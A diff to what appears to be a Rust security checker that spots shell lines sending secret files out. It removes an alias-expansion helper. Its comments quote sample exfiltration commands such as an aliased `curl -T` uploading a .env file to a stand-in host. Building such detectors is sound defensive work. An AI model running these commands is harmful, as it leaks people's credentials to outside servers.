@@ -640,11 +640,10 @@ impl Checker<'_> {
             }
         }
         for (at, unit) in units.iter().enumerate() {
-            let unit = self.aliased(unit);
             // Read from each other folder a `cd` before it may have left the
             // line in too, as the rules judge it (see [`Unit::others`]).
             let own = self
-                .secret_read(&unit, flow.stdin(at), &flow.written)
+                .secret_read(unit, flow.stdin(at), &flow.written)
                 .or_else(|| {
                     unit.others().into_iter().find_map(|dir| {
                         self.secret_read(&unit.in_folder(dir), flow.stdin(at), &flow.written)
@@ -869,38 +868,6 @@ impl Checker<'_> {
                 flow.calls.entry(*at).or_default().sends = true;
             }
         }
-    }
-
-    /// A call of an alias the line defines with words of its own, as the
-    /// shell runs it: the last command of the alias's value with the call's
-    /// words after its own (`alias c='curl -T'; c .env https://x` runs `curl
-    /// -T .env https://x`). Any other unit as it is.
-    fn aliased<'u>(&self, unit: &'u Unit) -> Cow<'u, Unit> {
-        if unit.shell != Shell::Posix || unit.args.is_empty() {
-            return Cow::Borrowed(unit);
-        }
-        let Some(name) = unit
-            .program
-            .known()
-            .filter(|name| self.split.is_alias(name))
-        else {
-            return Cow::Borrowed(unit);
-        };
-        let last = self
-            .split
-            .bodies_of(name)
-            .last()
-            .and_then(|body| body.end.checked_sub(1))
-            .and_then(|at| self.split.units.get(at));
-        let Some(last) = last else {
-            return Cow::Borrowed(unit);
-        };
-        Cow::Owned(Unit {
-            program: last.program.clone(),
-            args: last.args.iter().chain(&unit.args).cloned().collect(),
-            wrappers: last.wrappers.clone(),
-            ..Unit::clone(unit)
-        })
     }
 
     /// The files the line writes from a secret it reads or is handed, by
@@ -1280,20 +1247,14 @@ impl Checker<'_> {
                 None,
             );
         }
-        // A call of an alias with words of its own runs the alias's last
-        // command with them, which is judged as such; any other call of a
-        // function or an alias sends what it is given when its body sends.
-        let aliased = self.aliased(unit);
-        let alias_key = if let Cow::Owned(unit) = &aliased {
-            unit.key()
-        } else {
-            self.call(at);
-            None
-        };
-        let key = alias_key.as_deref().unwrap_or(key);
+        // A call of a function or an alias sends what it is given when its
+        // body sends. (A use of an alias with words of its own is followed
+        // by the command it runs, the alias's last command with the words
+        // after its own, which is judged as such.)
+        self.call(at);
         // A file named under a folder only known when it runs is sent by
         // its name (`curl -T "$PWD/.env"`).
-        let named = self.named_send(&aliased);
+        let named = self.named_send(unit);
         let unit: &Unit = &named;
         for file in uploads(unit, key) {
             if let Some(hit) = self.secret(unit, &file.arg, false, file.word) {
